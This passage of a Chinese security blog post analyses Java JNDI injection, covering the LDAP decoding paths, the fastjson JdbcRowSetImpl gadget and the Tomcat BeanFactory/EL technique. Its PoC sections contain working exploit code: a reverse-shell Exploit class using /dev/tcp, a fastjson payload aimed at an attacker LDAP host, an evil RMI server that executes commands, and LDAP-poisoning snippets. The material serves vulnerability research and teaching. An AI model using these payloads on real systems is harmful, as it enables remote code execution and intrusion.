+        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">return</span> <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// objectClass (JNDI References)</span>
+            var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> var1 <span class="token operator">==</span> null <span class="token operator">||</span> <span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>JAVA_OBJECT_CLASSES_LOWER<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> null <span class="token operator">:</span> <span class="token function">decodeReference</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        NamingException var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        var4<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">throw</span> var4<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>调用链</p>
+<pre class=" language-plain"><code class="language-plain">exec:347, Runtime (java.lang)
+<clinit>:4, Exploit
+forName0:-1, Class (java.lang)
+forName:278, Class (java.lang)
+loadClass:72, VersionHelper12 (com.sun.naming.internal)
+loadClass:87, VersionHelper12 (com.sun.naming.internal)
+getObjectFactoryFromReference:158, NamingManager (javax.naming.spi)
+getObjectInstance:188, DirectoryManager (javax.naming.spi)
+
+   - decodeObject:234, Obj (com.sun.jndi.ldap)
+
+c_lookup:1086, LdapCtx (com.sun.jndi.ldap)
+p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)
+lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
+lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
+lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
+lookup:411, InitialContext (javax.naming)
+main:7, Test</code></pre>
+<h4 id="Serialized-Object"><a href="#Serialized-Object" class="headerlink" title="Serialized Object"></a>Serialized Object</h4><blockquote>
+<p>Serialized and Marshalled object graphs use java serialization to get the binary representation that<br>gets stored in the “javaSerializedData” attribute defined in the Java Schema.<br>The following code in Obj.decodeObject(Attributes attrs) will deserialize the contents of the<br>“javaSerializedData” attribute if present</p>
+</blockquote>
+<p>被序列化的或对象图进行序列化而获取二进制描述，从而判断是否存在<code>javaSerializedData</code>标志，如果被标记则会对内容进行反序列化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15525458343584.jpg" alt="-w265"></p>
+<p><code>javaCodeBase</code>属性可以在反序列化期间指明目标类文件的 URL 地址，攻击者可通过控制恶意class文件的readObject()函数在反序列化中执行恶意payload，但是还需要jdk中设置<code>com.sun.jndi.ldap.object.trustURLCodebase=true</code></p>
+<p>由此引出通过CLASSPATH绕过信任类检测，PDF：<a href="https://community.microfocus.com/t5/Security-Research-Blog/The-perils-of-Java-deserialization/ba-p/246211?attachment-id=62785" target="_blank" rel="noopener">The perils of Java deserialization</a></p>
+<h4 id="Remote-Location"><a href="#Remote-Location" class="headerlink" title="Remote Location"></a>Remote Location</h4><p>和上面类似，通过判断<code>javaRemoteLocation</code>标志，然后进行<code>decodeRmiObject</code></p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>var1 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span>var0<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>JAVA_ATTRIBUTES<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// com.sun.jndi.ldap.Obj#decodeRmiObject</span>
+<span class="token keyword">private</span> <span class="token keyword">static</span> Object <span class="token function">decodeRmiObject</span><span class="token punctuation">(</span>String var0<span class="token punctuation">,</span> String var1<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"URL"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<h3 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a><del>CORBA</del></h3><h4 id="IOR"><a href="#IOR" class="headerlink" title="IOR"></a><del>IOR</del></h4><h2 id="相关利用"><a href="#相关利用" class="headerlink" title="相关利用"></a>相关利用</h2><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><h4 id="JNDI-amp-JdbcRowSetImpl-Gadgets"><a href="#JNDI-amp-JdbcRowSetImpl-Gadgets" class="headerlink" title="JNDI &amp; JdbcRowSetImpl Gadgets"></a>JNDI &amp; JdbcRowSetImpl Gadgets</h4><p>FastJson将JSON字符串反序列化到指定的Java类时，会调用目标类的getter、setter等方法。</p>
+<p>JdbcRowSetImpl类的setAutoCommit()会调用connect()函数</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAutoCommit</span><span class="token punctuation">(</span><span class="token keyword">boolean</span> var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token comment" spellcheck="true">// 触发点</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">.</span><span class="token function">setAutoCommit</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span></code></pre>
+<p>connect()函数如下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> Connection <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conn <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDataSourceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            InitialContext var1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment" spellcheck="true">// 触发点</span>
+            DataSource var2 <span class="token operator">=</span> <span class="token punctuation">(</span>DataSource<span class="token punctuation">)</span>var1<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getDataSourceName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token operator">?</span>var2<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span>var2<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var3<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SQLException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>resBundle<span class="token punctuation">.</span><span class="token function">handleGetObject</span><span class="token punctuation">(</span><span class="token string">"jdbcrowsetimpl.connect"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token operator">?</span>DriverManager<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span>null<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>connect()会调用InitialContext.lookup(dataSourceName)，这里的参数dataSourceName是在setter方法setDataSourceName(String name)中设置的。所以在FastJson反序列化漏洞过程中，我们可以控制dataSourceName的值，也就是说满足了JNDI注入利用的条件</p>
+<h4 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h4><p>marshalsec 创建监听一个 LDAP Server</p>
+<pre class=" language-shell"><code class="language-shell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://X.X.X.X:8888/\#Exploit</code></pre>
+<p>Exploit.java(需自行编译为class文件放置8888端口服务器目录下)</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>
+    <span class="token keyword">static</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"bash -i >&amp; /dev/tcp/&lt;ip>/&lt;port> 0>&amp;1"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>payload</p>
+<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span> <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://X.X.X.X:1389/Exploit"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span></code></pre>
+<h3 id="getObjectInstance-amp-JNDI-注入"><a href="#getObjectInstance-amp-JNDI-注入" class="headerlink" title="getObjectInstance &amp; JNDI 注入"></a>getObjectInstance &amp; JNDI 注入</h3><p>条件：</p>
+<ol>
+<li>需要el依赖包</li>
+<li>控制lookup参数值</li>
+</ol>
+<p>版本：</p>
+<table>
+<thead>
+<tr>
+<th align="center">application</th>
+<th align="center">verson</th>
+<th align="center">dependency</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Tomcat</td>
+<td align="center">&gt; 8.5</td>
+<td align="center">tomcat-jsp-api</td>
+</tr>
+</tbody></table>
+<p>其他应用及版本未知</p>
+<h4 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h4><p>在恶意服务器上运行编译后的class文件</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>*<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>ResourceRef<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilRMIServerNew</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1097"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1097</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>
+        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span>
+        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"Object"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p>控制目标服务器lookup参数</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"rmi://127.0.0.1:1097/Object"</span><span class="token punctuation">)</span></code></pre>
+<p>由于<code>org.apache.naming.factory.BeanFactory</code>拓展了<code>javax.naming.Reference</code>，只有当<code>org.apache.naming.factory.BeanFactory</code>被调用用于从Reference中获取<code>真的</code>(因为 RMI 注册表已经被覆盖)目标对象时，才会触发 RCE</p>
+<pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">// 本地测试代码</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span>
+<span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
+        String uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/Object"</span><span class="token punctuation">;</span>
+        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/469de5e6/15524894756369.jpg" alt></p>
+<h3 id="LDAP-Java-Serialization"><a href="#LDAP-Java-Serialization" class="headerlink" title="LDAP Java Serialization"></a>LDAP Java Serialization</h3><p>原文作者提供的代码</p>
+<p>其他可见：<a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-WITH-LDAP-Unserialize/" target="_blank" rel="noopener">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-WITH-LDAP-Unserialize/</a></p>
+<pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Poisoning LDAP user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BasicAttribute mod1 <span class="token operator">=</span> <span class="token keyword">new</span>
+<span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaCodebase"</span><span class="token punctuation">,</span>attackerURL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BasicAttribute mod2 <span class="token operator">=</span> <span class="token keyword">new</span>
+<span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span><span class="token string">"DeserPayload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BasicAttribute mod3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaSerializedData"</span><span class="token punctuation">,</span>
+serializedBytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ModificationItem<span class="token punctuation">[</span><span class="token punctuation">]</span> mods <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+mods<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+mods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+mods<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ctx<span class="token punctuation">.</span><span class="token function">modifyAttributes</span><span class="token punctuation">(</span><span class="token string">"uid=target,ou=People,dc=example,dc=com"</span><span class="token punctuation">,</span> mods<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h3 id="LDAP-Remote-Location"><a href="#LDAP-Remote-Location" class="headerlink" title="LDAP Remote Location"></a>LDAP Remote Location</h3><p>原文作者提供的代码</p>
+<pre class=" language-java"><code class="language-java">System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Poisoning LDAP user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BasicAttribute mod1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaRemoteLocation"</span><span class="token punctuation">,</span>
+<span class="token string">"rmi://attackerURL/PayloadObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+BasicAttribute mod2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BasicAttribute</span><span class="token punctuation">(</span><span class="token string">"javaClassName"</span><span class="token punctuation">,</span>
+<span class="token string">"PayloadObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ModificationItem<span class="token punctuation">[</span><span class="token punctuation">]</span> mods <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+mods<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+mods<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModificationItem</span><span class="token punctuation">(</span>DirContext<span class="token punctuation">.</span>ADD_ATTRIBUTE<span class="token punctuation">,</span> mod2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ctx<span class="token punctuation">.</span><span class="token function">modifyAttributes</span><span class="token punctuation">(</span><span class="token string">"uid=target,ou=People,dc=example,dc=com"</span><span class="token punctuation">,</span> mods<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol>
+<li>廖新喜: <a href="http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson%20RCE%20PoC构造与分析/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson%20RCE%20PoC构造与分析/</a></li>
+<li>※ 深入理解JNDI注入与Java反序列化漏洞利用: <a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a></li>
+<li>BlackHat-PPT: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a></li>
+<li>※ BlackHat-WP: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a></li>
+<li>※ <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></li>
